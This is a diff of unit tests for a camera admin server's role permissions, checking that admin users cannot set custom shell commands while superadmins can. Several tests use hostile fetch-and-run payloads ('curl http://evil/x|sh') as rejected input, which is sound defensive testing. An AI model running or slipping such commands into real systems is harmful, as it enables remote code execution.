@@ -497,6 +497,170 @@ class ConfigServerTestCase(unittest.TestCase):
             camera["local_command"], timeout_s=camera["timeout_s"]
         )
 
+    @patch("fenetre.admin_server._fetch_local_command_bytes")
+    def test_admin_role_can_add_plain_rtsp_camera_without_command_approval(
+        self, mock_fetch
+    ):
+        # The Fenetre-generated RTSP snapshot command that every plain RTSP
+        # camera gets auto-derived from rtsp_url is safe and must not require
+        # superadmin, or the documented "admin" role could no longer manage
+        # an ordinary RTSP camera.
+        mock_fetch.return_value = (b"jpeg", "image/jpeg", (1920, 1080))
+        self.test_config_data["users"] = {
+            "admin": {
+                "role": "admin",
+                "password_hash": hash_password("adminpw"),
+                "ptz_access": "manual",
+                "ptz_cameras": [],
+            },
+        }
+        with open(self.temp_config_file.name, "w") as f:
+            yaml.safe_dump(self.test_config_data, f)
+        flask_app.config["FENETRE_ADMIN_AUTH_ENABLED"] = True
+        admin_token = base64.b64encode(b"admin:adminpw").decode("ascii")
+
+        response = self.app.post(
+            "/api/camera/add",
+            data=json.dumps(
+                {
+                    "name": "rtsp-cam",
+                    "capture_source": "rtsp",
+                    "rtsp_url": "rtsp://admin:secret@camera:554/11",
+                    "require_test": True,
+                }
+            ),
+            content_type="application/json",
+            headers={"Authorization": f"Basic {admin_token}"},
+        )
+
+        self.assertEqual(response.status_code, 200)
+
+    def test_admin_role_cannot_add_camera_with_custom_local_command(self):
+        self.test_config_data["users"] = {
+            "admin": {
+                "role": "admin",
+                "password_hash": hash_password("adminpw"),
+                "ptz_access": "manual",
+                "ptz_cameras": [],
+            },
+        }
+        with open(self.temp_config_file.name, "w") as f:
+            yaml.safe_dump(self.test_config_data, f)
+        flask_app.config["FENETRE_ADMIN_AUTH_ENABLED"] = True
+        admin_token = base64.b64encode(b"admin:adminpw").decode("ascii")
+
+        response = self.app.post(
+            "/api/camera/add",
+            data=json.dumps(
+                {
+                    "name": "evil-cam",
+                    "capture_source": "rtsp",
+                    "local_command": "sh -c 'curl http://evil/x|sh'",
+                    "require_test": False,
+                }
+            ),
+            content_type="application/json",
+            headers={"Authorization": f"Basic {admin_token}"},
+        )
+
+        self.assertEqual(response.status_code, 403)
+        with open(self.temp_config_file.name, "r") as f:
+            updated_data_yaml = yaml.safe_load(f)
+        self.assertNotIn("evil-cam", updated_data_yaml.get("cameras") or {})
+
+    def test_superadmin_can_add_camera_with_custom_local_command(self):
+        self.test_config_data["users"] = {
+            "root": {
+                "role": "superadmin",
+                "password_hash": hash_password("rootpw"),
+            },
+        }
+        with open(self.temp_config_file.name, "w") as f:
+            yaml.safe_dump(self.test_config_data, f)
+        flask_app.config["FENETRE_ADMIN_AUTH_ENABLED"] = True
+        root_token = base64.b64encode(b"root:rootpw").decode("ascii")
+
+        response = self.app.post(
+            "/api/camera/add",
+            data=json.dumps(
+                {
+                    "name": "custom-cam",
+                    "capture_source": "rtsp",
+                    "local_command": "ffmpeg -i rtsp://cam/1 -frames:v 1 -f image2pipe -",
+                    "require_test": False,
+                }
+            ),
+            content_type="application/json",
+            headers={"Authorization": f"Basic {root_token}"},
+        )
+
+        self.assertEqual(response.status_code, 200)
+
+    def test_admin_role_cannot_set_unavailable_command_via_raw_config_put(self):
+        self.test_config_data["cameras"] = {"cam1": {"url": "http://localhost"}}
+        self.test_config_data["users"] = {
+            "admin": {
+                "role": "admin",
+                "password_hash": hash_password("adminpw"),
+                "ptz_access": "manual",
+                "ptz_cameras": [],
+            },
+        }
+        with open(self.temp_config_file.name, "w") as f:
+            yaml.safe_dump(self.test_config_data, f)
+        flask_app.config["FENETRE_ADMIN_AUTH_ENABLED"] = True
+        admin_token = base64.b64encode(b"admin:adminpw").decode("ascii")
+
+        response = self.app.put(
+            "/config",
+            data=json.dumps(
+                {
+                    "global": self.test_config_data["global"],
+                    "cameras": {
+                        "cam1": {
+                            "url": "http://localhost",
+                            "unavailable_command": "curl http://evil/x|sh",
+                        }
+                    },
+                }
+            ),
+            content_type="application/json",
+            headers={"Authorization": f"Basic {admin_token}"},
+        )
+
+        self.assertEqual(response.status_code, 403)
+        with open(self.temp_config_file.name, "r") as f:
+            updated_data_yaml = yaml.safe_load(f)
+        self.assertNotIn("unavailable_command", updated_data_yaml["cameras"]["cam1"])
+
+    def test_admin_role_cannot_run_test_snapshot_with_custom_local_command(self):
+        self.test_config_data["users"] = {
+            "admin": {
+                "role": "admin",
+                "password_hash": hash_password("adminpw"),
+                "ptz_access": "manual",
+                "ptz_cameras": [],
+            },
+        }
+        with open(self.temp_config_file.name, "w") as f:
+            yaml.safe_dump(self.test_config_data, f)
+        flask_app.config["FENETRE_ADMIN_AUTH_ENABLED"] = True
+        admin_token = base64.b64encode(b"admin:adminpw").decode("ascii")
+
+        response = self.app.post(
+            "/api/camera/test_snapshot",
+            data=json.dumps(
+                {
+                    "capture_source": "rtsp",
+                    "local_command": "sh -c 'id'",
+                }
+            ),
+            content_type="application/json",
+            headers={"Authorization": f"Basic {admin_token}"},
+        )
+
+        self.assertEqual(response.status_code, 403)
+
     @patch("fenetre.admin_server.requests.put")
     def test_add_snapshot_camera_preserves_rtsp_live_view_url(self, mock_go2rtc_put):
         mock_go2rtc_put.return_value.status_code = 200
